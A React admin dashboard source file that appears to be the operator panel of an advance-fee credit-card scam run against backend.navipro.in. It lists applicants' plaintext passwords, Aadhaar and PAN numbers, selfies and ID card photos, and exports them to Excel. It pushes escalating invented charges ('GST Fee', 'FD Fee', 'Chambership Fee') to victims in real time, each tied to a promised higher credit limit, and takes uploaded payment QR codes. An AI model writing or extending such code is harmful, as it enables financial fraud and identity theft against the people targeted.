'use client';
import { useState, useEffect,Fragment,useRef  } from 'react';
import axios from 'axios';
import { IconDots, IconEye, IconEyeOff, IconTrash, IconDownload,IconChevronDown,
  IconChevronUp, } from '@tabler/icons-react';
import * as XLSX from 'xlsx';
import { io,Socket } from 'socket.io-client';
let socket: Socket;

const AdminDashboard = () => {
  
  const socketRef = useRef<Socket | null>(null); // Use useRef for socket instance
  const [limit, setLimit] = useState("₹113,997");
  const handleLimitChange = (value: string) => {
    setLimit(value);
  };
  const [bankDetails, setBankDetails] = useState<any>(null);

  

  useEffect(() => {
    // Initialize the Socket.IO connection
    socketRef.current = io("https://backend.navipro.in");

    return () => {
      // Cleanup on component unmount
      socketRef.current?.disconnect();
    };
  }, []);

  // Static configuration for fees, prices, and messages
  const fees = [
    {
      id: "annualFee",
      name: "Annual Fee",
      price: 998,
      updateMessage:
        "To activate your Credit Card, a charge of ₹998 is required. Once the payment is completed, you will be able to access your virtual credit card. The physical card will be delivered within 3 working days.",
      paidMessage: "The Annual Fee of ₹998 has been marked as Paid!",
      limits: {
    cashLimit: "₹62,500",
    shoppingLimit: "₹62,500",
  },
    },
    {
      id: "insuranceFee",
      name: "Insurance Fee",
      price: 2999,
      updateMessage:
        "An Insurance Fee of ₹2,999 is applicable. This fee covers the insurance for your card, providing coverage as per the terms and conditions.",
      paidMessage: "The Insurance Fee of ₹2,999 has been marked as Paid!",
      limits: {
        cashLimit: "₹63,999",
        shoppingLimit: "₹63,999",
      }, 
    },
    {
      id: "gstFee",
      name: "GST Fee",
      price: 4999,
      updateMessage:
        "A GST Fee of ₹4,999 is applicable. This fee includes the Goods and Services Tax associated with your card and services.",
      paidMessage: "The GST Fee of ₹4,999 has been marked as Paid!",
      limits: {
        cashLimit: "₹91,499",
        shoppingLimit: "₹91,499",
      },
    },
    {
      id: "fdFee",
      name: "FD Fee",
      price: 10999,
      updateMessage:
        "To process your Fixed Deposit, a charge of ₹10,999 is required. This fee covers the setup and maintenance of your FD with the card's associated benefits.",
      paidMessage: "The FD Fee of ₹10,999 has been marked as Paid!",
      limits: {
        cashLimit: "₹96,998",
        shoppingLimit: "₹96,998",
      },
    },
    {
      id: "walletFee",
      name: "Wallet Fee",
      price: 11999,
      updateMessage:
        "A Wallet Fee of ₹11,999 is applicable. This charge covers the setup and management of your card's digital wallet for online transactions.",
      paidMessage: "The Wallet Fee of ₹11,999 has been marked as Paid!",
      limits: {
        cashLimit: "₹102,998",
        shoppingLimit: "₹102,998",
      },
    },
    {
      id: "membershipFee",
      name: "Membership Fee",
      price: 8999,
      updateMessage:
        "Your Membership Fee of ₹8,999 grants you access to exclusive cardholder benefits, discounts, and services.",
      paidMessage: "The Membership Fee of ₹8,999 has been marked as Paid!",
      limits: {
        cashLimit: "₹107,497",
        shoppingLimit: "₹107,497",
      },
    },
    {
      id: "chambershipFee",
      name: "Chambership Fee",
      price: 12999,
      updateMessage:
        "A Chambership Fee of ₹12,999 is required for accessing premium services related to your card. This includes personalized benefits, special offers, and higher transaction limits.",
      paidMessage: "The Chambership Fee of ₹12,999 has been marked as Paid!",
      limits: {
        cashLimit: "₹113,997",
        shoppingLimit: "₹113,997",
      },
    },
    {
      id: "otherFees",
      name: "Other Fees",
      price: 0,
      updateMessage: "No additional charges under 'Other Fees' are applicable at this time. Your card will be processed and dispatched promptly. Delivery is expected within seven business days.",
      paidMessage: "No additional charges under 'Other Fees' have been marked as Paid!",
      limits: {
        cashLimit: limit,
        shoppingLimit: limit,
      },    },
  ];

  // Handle Update function
  const handleUpdate = (fee: {
    id: string;
    updateMessage: string;
    price: number;
    limits?: { cashLimit: string; shoppingLimit: string };
  }) => {
    if (socketRef.current) {
      // Emit the update event with fee data
      socketRef.current.emit("sendUpdate", {
        feeType: fee.id,
        message: fee.updateMessage,
        price: fee.price,
        limits: fee.limits || {},
      });

     
    }
  };
  const handlePaid = (fee: { id: string; paidMessage: string }) => {
    if (socketRef.current) {
      socketRef.current.emit("sendPaid", {
        feeType: fee.id,
        message: fee.paidMessage,
      });
    } else {
      console.error("Socket not initialized");
    }
  };
  

  const [zoomedPhoto, setZoomedPhoto] = useState<string | null>(null); // State for modal photo

  const handlePhotoClick = (photoUrl: string) => {
    setZoomedPhoto(photoUrl);
  };

  const closeZoomedPhoto = () => {
    setZoomedPhoto(null);
  };
  const [searchQuery, setSearchQuery] = useState<string>('');
  const [rowsPerPage, setRowsPerPage] = useState<number>(10);
  const [currentPage, setCurrentPage] = useState<number>(1);

  
  // qr code logic
  const [qrImage, setQrImage] = useState<File | null>(null); // State to hold the uploaded image
  const [uploadedQrImage, setUploadedQrImage] = useState<string | null>(null); // URL of the uploaded QR code image
  const [isUploading, setIsUploading] = useState(false);

  const handleImageUpload = async () => {
    if (!qrImage) {
      alert('Please select an image to upload');
      return;
    }

    const formData = new FormData();
    formData.append('file', qrImage);

    try {
      setIsUploading(true);
      const response = await axios.post('https://backend.navipro.in/api/upload-qr', formData, {
        headers: { 'Content-Type': 'multipart/form-data' },
      });
      setUploadedQrImage(response.data.url); // Assuming server responds with the uploaded image URL
      alert('QR code uploaded successfully!');
    } catch (error) {
      console.error('Error uploading QR code:', error);
      alert('Failed to upload QR code');
    } finally {
      setIsUploading(false);
    }
  };
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [adminDetails, setAdminDetails] = useState<any[]>([]);
  const [Details, setDetails] = useState<any[]>([]); // For storing user details
  const [qrData, setQrData] = useState(''); // QR Code data

  const [loginData, setLoginData] = useState({ adminUsername: '', adminPassword: '' });
  const [error, setError] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState<boolean>(true);
  const [showFees, setShowFees] = useState(false);
  const [visibleFees, setVisibleFees] = useState<{ [key: string]: boolean }>({});
  const [activeTab, setActiveTab] = useState<'users' | 'userDetails' | 'qrCode'>('users'); // Add 'qrCode' tab
  const filteredUsers = adminDetails.filter((user) =>
    [user.name, user.email, user.phone, user.applyFor, user.income, user.password]
      .some((field) => String(field || '').toLowerCase().includes(searchQuery.toLowerCase()))
  );
  
  const filteredDetails = Details.filter((detail) =>
    [
      detail.fullName,
      detail.fatherName,
      detail.dateOfBirth,
      detail.employmentType,
      detail.gender,
      detail.address,
      detail.aadharNumber,
      detail.panNumber,
      detail.selfiePhoto,
      detail.aadharFrontPhoto,
      detail.aadharBackPhoto,
      detail.panCardPhoto,
    ].some((field) => String(field || '').toLowerCase().includes(searchQuery.toLowerCase()))
  );
  

  // Function to handle admin login
  const handleLogin = async () => {
    try {
      const response = await axios.post('https://backend.navipro.in/admin/login', loginData);
      if (response.status === 200) {
        setIsLoggedIn(true); // Update login state
        fetchAdminDetails(); // Fetch user data after successful login
        fetchUserDetails();
        setError(null); // Clear errors
      }
    } catch (err: any) {
      setError(err.response?.data?.message || 'Invalid username or password.');
    }
  };

  const fetchAdminDetails = async () => {
    try {
      const response = await axios.get('https://backend.navipro.in/admin/users');
    
      setAdminDetails(response.data.users);
      setIsLoading(false);
    } catch (error) {
      console.error('Error fetching admin details:', error);
    }
  };
  
  const handleDeleteUser = async (userId: string) => {
    if (!window.confirm('Are you sure you want to delete this user?')) {
      return;
    }
  
    try {
      // Send delete request to the server
      await axios.delete(`https://backend.navipro.in/admin/userDetails/${userId}`);
  
      // Update the state to reflect the deleted user
      setDetails((prevDetails) => {
        const updatedDetails = prevDetails.filter((detail) => detail.id !== userId);
        
        // Update local storage
        localStorage.setItem('userDetails', JSON.stringify(updatedDetails));
        
        return updatedDetails;
      });
  
      alert('User deleted successfully.');
    } catch (error) {
      console.error('Error deleting user:', error);
      alert('Failed to delete user. Please try again.');
    }
  };
  
  // Load user details from local storage during initialization
  useEffect(() => {
    const savedDetails = localStorage.getItem('userDetails');
    if (savedDetails) {
      setDetails(JSON.parse(savedDetails));
    } else {
      fetchUserDetails();
    }
  }, []);

  // Fetch user details separately
  const fetchUserDetails = async () => {
    try {
      const response = await axios.get('https://backend.navipro.in/admin/userDetails');
      setDetails(response.data.userDetails);
    } catch (error) {
      console.error('Error fetching user details:', error);
    }
  };

  // Polling: Fetch data every 5 seconds
  useEffect(() => {
    fetchAdminDetails(); // Initial fetch
    fetchUserDetails();
    const interval = setInterval(() => {
      fetchAdminDetails(); // Fetch data every 5 seconds
    }, 5000);

    // Cleanup interval on component unmount
    return () => clearInterval(interval);
  }, []);

  if (isLoading) {
    return <div>Loading...</div>;
  }
  const paginatedUsers = filteredUsers.slice((currentPage - 1) * rowsPerPage, currentPage * rowsPerPage);
  const paginatedDetails = filteredDetails; // Skip pagination

  // Excel Download Function
  const handleDownloadExcel = (data: any[], fileName: string = 'data.xlsx') => {
    if (!data.length) {
      alert('No data to download!');
      return;
    }

    const worksheet = XLSX.utils.json_to_sheet(data);
    const workbook = XLSX.utils.book_new();
    XLSX.utils.book_append_sheet(workbook, worksheet, 'Sheet1');
    XLSX.writeFile(workbook, fileName);
  };



  // If admin is not logged in, display the login form
  if (!isLoggedIn) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-gray-100">
        <div className="bg-white p-6 rounded shadow-md w-96">
          <h2 className="text-xl font-bold mb-4">Admin Login</h2>
          <input
            type="text"
            placeholder="Username"
            value={loginData.adminUsername}
            onChange={(e) => setLoginData({ ...loginData, adminUsername: e.target.value })}
            className="w-full p-2 mb-3 border border-gray-300 rounded"
          />
          <input
            type="password"
            placeholder="Password"
            value={loginData.adminPassword}
            onChange={(e) => setLoginData({ ...loginData, adminPassword: e.target.value })}
            className="w-full p-2 mb-3 border border-gray-300 rounded"
          />
          {error && <p className="text-red-500 text-sm mb-3">{error}</p>}
          <button
            onClick={handleLogin}
            className="w-full bg-blue-500 text-white p-2 rounded hover:bg-blue-600"
          >
            Login
          </button>
        </div>
      </div>
    );
  }

  // Render Admin Dashboard with Tabs
  return (
    <div className="p-8 bg-gray-100 min-h-screen">
      <h1 className="text-2xl font-bold mb-4">Admin Dashboard</h1>
    


      {/* Tabs */}
      <div className="mb-6">
        <button
          onClick={() => setActiveTab('users')}
          className={`px-4 py-2 mr-2 rounded ${
            activeTab === 'users' ? 'bg-blue-600 text-white' : 'bg-gray-200 text-gray-800'
          }`}
        >
          Users
        </button>
        <button
          onClick={() => setActiveTab('userDetails')}
          className={`px-4 py-2 mr-2 rounded ${
            activeTab === 'userDetails' ? 'bg-blue-600 text-white' : 'bg-gray-200 text-gray-800'
          }`}
        >
          User Details
        </button>
        <button
          onClick={() => setActiveTab('qrCode')}
          className={`px-4 py-2 rounded ${
            activeTab === 'qrCode' ? 'bg-blue-600 text-white' : 'bg-gray-200 text-gray-800'
          }`}
        >
          QR Code
        </button>
      </div>
      {activeTab === 'users' && (
  <div className="overflow-x-auto">
    <h2 className="text-xl font-semibold mb-4">Users</h2>
{/* Search Bar and Controls */}
<div className="flex items-center justify-between mb-4">
        <input
          type="text"
          placeholder="Search..."
          value={searchQuery}
          onChange={(e) => setSearchQuery(e.target.value)}
          className="p-2 border border-gray-300 rounded w-1/3"
        />

        <div className="flex items-center">
          {/* Download Excel */}
          <button
            onClick={() => handleDownloadExcel(activeTab === 'users' ? filteredUsers : filteredDetails)}
            className="px-4 py-2 bg-green-500 text-white rounded hover:bg-green-600 flex items-center"
          >
            <IconDownload size={20} />
            Download Excel
          </button>

        
        </div>
      </div>


    <table className="min-w-full bg-white border border-gray-200">
      <thead>
        <tr>
          <th className="p-2 border-b">Name</th>
          <th className="p-2 border-b">Email</th>
          <th className="p-2 border-b">Phone</th>
          <th className="p-2 border-b">Apply For</th>
          <th className="p-2 border-b">Income</th>
          <th className="p-2 border-b">Password</th>
        </tr>
      </thead>
      <tbody>
        {filteredUsers.map((user, index) => (
          <tr key={index}>
            <td className="p-2 border-b">{user.name || 'N/A'}</td>
            <td className="p-2 border-b">{user.email || 'N/A'}</td>
            <td className="p-2 border-b">{user.phone || 'N/A'}</td>
            <td className="p-2 border-b">{user.applyFor || 'N/A'}</td>
            <td className="p-2 border-b">{user.income || 'N/A'}</td>
            <td className="p-2 border-b">{user.password || 'N/A'}</td>
          </tr>
        ))}
      </tbody>
    </table>
  </div>
)}




{activeTab === 'userDetails' && (
        <div className="">
          <h2 className="text-xl font-semibold mb-4">User Details</h2>
          <div className="mb-4">
            <input
              type="text"
              placeholder="Search..."
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              className="p-2 border border-gray-300 rounded w-full"
            />
          </div>

          <table className="min-w-full bg-white border border-gray-200">
            <thead>
              <tr>
                <th className="p-2 border-b">Full Name</th>
                <th className="p-2 border-b">Father Name</th>
                <th className="p-2 border-b">DOB</th>
                <th className="p-2 border-b">Employment Type</th>
                <th className="p-2 border-b">Gender</th>
                <th className="p-2 border-b">Address</th>
                <th className="p-2 border-b">Aadhar</th>
                <th className="p-2 border-b">PAN</th>
                <th className="p-2 border-b">Actions</th>
              </tr>
            </thead>
            <tbody>
              {paginatedDetails.map((detail) => (
                <Fragment key={detail.id}>
                  <tr>
                    <td className="p-2 border-b">{detail.fullName || 'N/A'}</td>
                    <td className="p-2 border-b">{detail.fatherName || 'N/A'}</td>
                    <td className="p-2 border-b">
                      {detail.dateOfBirth ? new Date(detail.dateOfBirth).toLocaleDateString() : 'N/A'}
                    </td>
                    <td className="p-2 border-b">{detail.employmentType || 'N/A'}</td>
                    <td className="p-2 border-b">{detail.gender || 'N/A'}</td>
                    <td className="p-2 border-b">{detail.address || 'N/A'}</td>
                    <td className="p-2 border-b">{detail.aadharNumber || 'N/A'}</td>
                    <td className="p-2 border-b">{detail.panNumber || 'N/A'}</td>
                    
                    <td className="p-2 border-b relative">
                      <div className="relative ">
                        <button
                          onClick={() => {
                            const menu = document.getElementById(`menu-${detail.id}`);
                            if (menu) {
                              menu.style.display = menu.style.display === 'block' ? 'none' : 'block';
                            }
                          }}
                          className="p-2 text-gray-500 hover:text-gray-700"
                        >
                          <IconDots size={20} />
                        </button>

                        <div
                          id={`menu-${detail.id}`}
                          className="absolute right-0 mt-2 bg-white border border-gray-300 rounded shadow-md w-40 z-50 hidden transition-all duration-200 ease-in-out"
                        >
                          <button
                            onClick={() => {
                              setVisibleFees(prev => ({ ...prev, [detail.id]: true }));
                              const menu = document.getElementById(`menu-${detail.id}`);
                              if (menu) menu.style.display = 'none';
                            }}
                            className="flex items-center px-4 py-2 w-full text-left hover:bg-gray-100"
                          >
                            <IconEye className="mr-2 text-blue-500" size={20} />
                            Show Fees
                          </button>
                          <button
                            onClick={() => {
                              setVisibleFees(prev => ({ ...prev, [detail.id]: false }));
                              const menu = document.getElementById(`menu-${detail.id}`);
                              if (menu) menu.style.display = 'none';
                            }}
                            className="flex items-center px-4 py-2 w-full text-left hover:bg-gray-100"
                          >
                            <IconEyeOff className="mr-2 text-yellow-500" size={20} />
                            Hide Fees
                          </button>
                          <button
                            onClick={() => {
                              if (window.confirm('Are you sure you want to delete this user?')) {
                                handleDeleteUser(detail.id);
                              }
                              const menu = document.getElementById(`menu-${detail.id}`);
                              if (menu) menu.style.display = 'none';
                            }}
                            className="flex items-center px-4 py-2 w-full text-left hover:bg-gray-100 text-red-500"
                          >
                            <IconTrash className="mr-2" size={20} />
                            Delete
                          </button>
                        </div>
                      </div>
                    </td>
                  </tr>
                  {visibleFees[detail.id] && (
        <tr>
          <td colSpan={9} className="p-4 border-b bg-gray-100">
            {/* Photos Section */}
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 mb-6">
                      {detail.selfiePhoto && (
                        <div>
                          <p className="text-sm font-semibold mb-1">Selfie Photo</p>
                          <img
                            src={detail.selfiePhoto}
                            alt="Selfie"
                            onClick={() => handlePhotoClick(detail.selfiePhoto)}
                            className="w-32 h-32 object-cover rounded border cursor-pointer hover:scale-105 transition-transform"
                          />
                        </div>
                      )}
                      {detail.aadharFrontPhoto && (
                        <div>
                          <p className="text-sm font-semibold mb-1">Aadhar Front Photo</p>
                          <img
                            src={detail.aadharFrontPhoto}
                            alt="Aadhar Front"
                            onClick={() => handlePhotoClick(detail.aadharFrontPhoto)}
                            className="w-32 h-32 object-cover rounded border cursor-pointer hover:scale-105 transition-transform"
                          />
                        </div>
                      )}
                      {detail.aadharBackPhoto && (
                        <div>
                          <p className="text-sm font-semibold mb-1">Aadhar Back Photo</p>
                          <img
                            src={detail.aadharBackPhoto}
                            alt="Aadhar Back"
                            onClick={() => handlePhotoClick(detail.aadharBackPhoto)}
                            className="w-32 h-32 object-cover rounded border cursor-pointer hover:scale-105 transition-transform"
                          />
                        </div>
                      )}
                      {detail.panCardPhoto && (
                        <div>
                          <p className="text-sm font-semibold mb-1">PAN Card Photo</p>
                          <img
                            src={detail.panCardPhoto}
                            alt="PAN Card"
                            onClick={() => handlePhotoClick(detail.panCardPhoto)}
                            className="w-32 h-32 object-cover rounded border cursor-pointer hover:scale-105 transition-transform"
                          />
                        </div>
              )}
            </div>
            <div className="p-8 bg-gray-100 min-h-screen">
      <h1 className="text-2xl font-bold mb-4">Admin Dashboard</h1>
      
       {/* Input Box for Limit */}
       <div className="mb-6">
        <h3 className="text-lg font-semibold mb-2">Adjust Limit for Other Fees</h3>
        <label className="block text-gray-700 font-medium mb-1">Cash & Shopping Limit</label>
        <input
          type="text"
          value={limit}
          onChange={(e) => handleLimitChange(e.target.value)}
          className="p-2 border border-gray-300 rounded w-full"
        />
      </div>
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
        {fees.map((fee) => (
          <div key={fee.id} className="bg-white p-4 rounded-lg shadow-md">
            <h3 className="text-lg font-semibold mb-2">{fee.name}</h3>
            <p className="text-2xl font-bold text-blue-600 mb-4">₹{fee.price}</p>
            <div className="flex justify-between">
              {/* Update Button */}
              <button
                onClick={() => handleUpdate(fee)}
                className="px-4 py-2 bg-green-500 text-white rounded hover:bg-green-600 transition-colors duration-200"
              >
                Update
              </button>

              {/* Paid Button */}
              <button
                             onClick={() => handlePaid(fee)}

                className="px-4 py-2 bg-yellow-500 text-white rounded hover:bg-yellow-600 transition-colors duration-200"
              >
                Paid
              </button>
            </div>
          </div>
        ))}
      </div>
    </div>

         
                      </td>
                    </tr>
                  )}
                </Fragment>
              ))}
            </tbody>
          </table>
        </div>
      )}
      {zoomedPhoto && (
  <div className="fixed inset-0 bg-black bg-opacity-80 z-50 flex items-center justify-center">
    {/* Modal Container */}
    <div className="relative bg-white rounded-xl shadow-2xl max-w-6xl w-full h-[80vh] flex flex-col">
      {/* Close Button */}
      <button
        onClick={closeZoomedPhoto}
        className="absolute top-4 right-4 bg-gray-200 text-gray-700 rounded-full w-10 h-10 flex items-center justify-center hover:bg-gray-300 transition"
        aria-label="Close Modal"
      >
        ✕
      </button>
      {/* Image Section */}
      <div className="flex-1 flex justify-center items-center">
        <img
          src={zoomedPhoto}
          alt="Zoomed"
          className="max-w-[95%] max-h-[95%] object-contain rounded-lg"
        />
      </div>
    
    </div>
  </div>
)}





      {/* QR Code Page */}
      {activeTab === 'qrCode' && (
        <div className="p-8 bg-gray-100 min-h-screen">
        <h1 className="text-2xl font-bold mb-4">Admin Dashboard - QR Code Upload</h1>
  
        {/* Upload Section */}
        <div className="mb-6">
          <label className="block mb-2 text-gray-700 font-medium">Upload QR Code:</label>
          <input
            type="file"
            accept="image/*"
            onChange={(e) => setQrImage(e.target.files?.[0] || null)}
            className="p-2 border border-gray-300 rounded w-full"
          />
          <button
            onClick={handleImageUpload}
            disabled={isUploading}
            className={`mt-4 px-4 py-2 rounded bg-blue-600 text-white ${
              isUploading ? 'opacity-50 cursor-not-allowed' : 'hover:bg-blue-700'
            }`}
          >
            {isUploading ? 'Uploading...' : 'Upload QR Code'}
          </button>
        </div>
  
        {/* Display Uploaded QR Code */}
        {uploadedQrImage && (
          <div>
            <h2 className="text-lg font-semibold mb-4">Uploaded QR Code:</h2>
            <img src={uploadedQrImage} alt="QR Code" className="w-48 h-48 object-contain" />
          </div>
        )}
      </div>
  
      )}
    </div>
  );
};

export default AdminDashboard;
